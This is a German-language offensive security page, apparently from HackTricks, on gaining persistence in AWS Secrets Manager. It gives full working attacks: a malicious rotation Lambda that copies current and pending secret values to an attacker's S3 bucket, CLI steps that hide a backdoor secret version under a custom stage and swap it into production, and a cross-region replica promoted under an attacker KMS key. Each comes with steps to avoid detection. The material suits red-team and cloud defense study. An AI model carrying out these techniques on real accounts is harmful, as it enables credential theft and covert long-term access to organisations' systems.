# AWS - Secrets Manager Persistenz

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Für weitere Informationen siehe:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Über Resource Policies

Es ist möglich, externen Accounts über Resource Policies **Zugriff auf secrets zu gewähren**. Siehe die [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) für mehr Informationen. Beachte, dass ein externes Konto, um **auf ein Secret zuzugreifen**, außerdem **Zugriff auf den KMS key benötigt, der das Secret verschlüsselt**.

### Über Secrets Rotate Lambda

Um **Secrets automatisch zu rotieren** wird eine konfigurierte **Lambda** aufgerufen. Wenn ein Angreifer den **Code** ändern könnte, könnte er das neue **Secret** direkt an sich exfiltrieren.

So könnte der Lambda-Code für eine solche Aktion aussehen:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
{{#include ../../../../banners/hacktricks-training.md}}





### Swap the rotation Lambda to an attacker-controlled function via RotateSecret

Missbrauche `secretsmanager:RotateSecret`, um ein Secret an eine vom Angreifer kontrollierte Rotation-Lambda zu binden und eine sofortige Rotation auszulösen. Die bösartige Funktion exfiltriert die Secret-Versionen (AWSCURRENT/AWSPENDING) während der Rotationsschritte (createSecret/setSecret/testSecret/finishSecret) zu einem Exfiltrationsziel (z. B. S3 oder externes HTTP).

- Anforderungen
- Berechtigungen: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` auf der Angreifer-Lambda, `iam:CreateRole/PassRole/PutRolePolicy` (oder AttachRolePolicy) um die Lambda-Execution-Rolle mit `secretsmanager:GetSecretValue` und vorzugsweise `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (damit die Rotation weiter funktioniert) zu provisionieren, KMS `kms:Decrypt` für den Secret-KMS-Key, und `s3:PutObject` (oder ausgehender Datenverkehr) für die Exfiltration.
- Eine Ziel-Secret-ID (`SecretId`) mit aktivierter Rotation oder die Möglichkeit, Rotation zu aktivieren.

- Auswirkung
- Der Angreifer erhält die Secret-Werte ohne Änderung des legitimen Rotationscodes. Es wird nur die Rotationskonfiguration geändert, sodass sie auf die Angreifer-Lambda zeigt. Wenn dies nicht bemerkt wird, werden geplante zukünftige Rotationen weiterhin die Funktion des Angreifers aufrufen.

- Angriffsschritte (CLI)
1) Vorbereiten von Exfiltrationsziel und Lambda-Rolle
- Erstelle ein S3-Bucket für die Exfiltration und eine von Lambda vertraute Ausführungsrolle mit Berechtigungen, das Secret zu lesen und in S3 zu schreiben (plus Logs/KMS nach Bedarf).
2) Bereitstellen der Angreifer-Lambda, die bei jedem Rotationsschritt die Secret-Werte abruft und in S3 schreibt. Eine minimale Rotationslogik kann einfach AWSCURRENT nach AWSPENDING kopieren und in finishSecret wieder als aktuelle Version setzen, um den Dienst intakt zu halten.
3) Rotation neu binden und auslösen
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) Überprüfe die Exfiltration, indem du das S3-Präfix für dieses Secret auflistest und die JSON-Artefakte untersuchst.
5) (Optional) Stelle die ursprüngliche Rotation-Lambda wieder her, um die Entdeckung zu erschweren.

- Example attacker Lambda (Python) exfiltrating to S3
- Environment: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking für verdeckte Persistenz (custom stage + fast AWSCURRENT flip)

Missbrauche Secrets Manager Version-Staging-Labels, um eine vom Angreifer kontrollierte Secret-Version zu platzieren und unter einem benutzerdefinierten Stage (zum Beispiel `ATTACKER`) versteckt zu halten, während die Produktion weiterhin die ursprüngliche `AWSCURRENT` verwendet. Verschiebe zu jedem beliebigen Zeitpunkt `AWSCURRENT` auf die Version des Angreifers, um abhängige Workloads zu vergiften, und stelle sie dann wieder her, um die Entdeckung zu minimieren. Das bietet heimliche Backdoor-Persistenz und schnelle Manipulation zur Zeit der Nutzung, ohne den Secret-Namen oder die Rotationskonfiguration zu ändern.

- Requirements
- Berechtigungen: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (zur Verifikation)
- Ziel-Secret-ID in der Region.

- Impact
- Behalte eine versteckte, vom Angreifer kontrollierte Version eines Secrets und wechsele atomar `AWSCURRENT` bei Bedarf darauf, um jeden Consumer zu beeinflussen, der denselben Secret-Namen auflöst. Der Wechsel und die schnelle Rücksetzung reduzieren die Chance einer Entdeckung und ermöglichen zugleich eine zeitpunktbezogene Kompromittierung.

- Attack steps (CLI)
- Vorbereitung
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>CLI-Befehle</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Hinweise
- Wenn Sie `--client-request-token` angeben, verwendet Secrets Manager ihn als `VersionId`. Das Hinzufügen einer neuen Version ohne explizites Setzen von `--version-stages` verschiebt standardmäßig `AWSCURRENT` auf die neue Version und markiert die vorherige als `AWSPREVIOUS`.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Missbrauche die multi-Region-Replikation von Secrets Manager, um eine Replik eines Zielsecrets in eine weniger überwachte Region zu erstellen, diese mit einem vom Angreifer kontrollierten KMS-Key in dieser Region zu verschlüsseln, anschließend die Replik zu einem eigenständigen Secret zu promoten und eine permissive resource policy anzuhängen, die dem Angreifer Lesezugriff gewährt. Das ursprüngliche Secret in der primären Region bleibt unverändert, wodurch über die promotete Replik ein dauerhafter, unauffälliger Zugriff auf den Secret-Wert möglich ist, während KMS-/Policy-Beschränkungen der primären Region umgangen werden.

- Anforderungen
- Berechtigungen: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- In der Replica-Region: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (oder `kms:PutKeyPolicy`) um dem Angreifer-Principal `kms:Decrypt` zu erlauben.
- Ein Angreifer-Principal (user/role), der Lesezugriff auf das promotete Secret erhält.

- Auswirkungen
- Persistenter regionsübergreifender Zugriffspfad auf den Secret-Wert über eine eigenständige Replik, die unter einer vom Angreifer kontrollierten KMS CMK steht und eine permissive resource policy verwendet. Das primäre Secret in der ursprünglichen Region bleibt unberührt.

- Angriff (CLI)
- Variablen
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) Erstelle einen vom Angreifer kontrollierten KMS-Schlüssel in der Replikations-Region
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) Repliziere das secret nach R2 mithilfe des attacker KMS key
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) Die Replik in R2 zu einer eigenständigen Instanz machen
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) Hänge eine permissive resource policy an das standalone secret in R2 an.
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) Lese das secret vom attacker principal in R2
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```

